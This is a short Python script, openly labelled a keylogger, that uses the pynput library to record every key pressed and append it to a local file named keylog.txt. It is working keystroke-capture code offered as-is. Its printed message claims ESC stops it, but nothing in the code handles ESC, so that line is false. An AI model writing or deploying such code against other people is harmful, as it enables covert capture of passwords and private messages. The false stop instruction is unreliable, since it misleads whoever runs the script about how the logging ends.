from pynput.keyboard import Listener

def write_to_file(key):
    key = str(key).replace("'", "")  # Remove quotes around key
    with open("keylog.txt", "a") as f:
        f.write(key + "\n")

with Listener(on_press=write_to_file) as listener:
    print("Keylogger is running... Press ESC to stop.")
    listener.join()
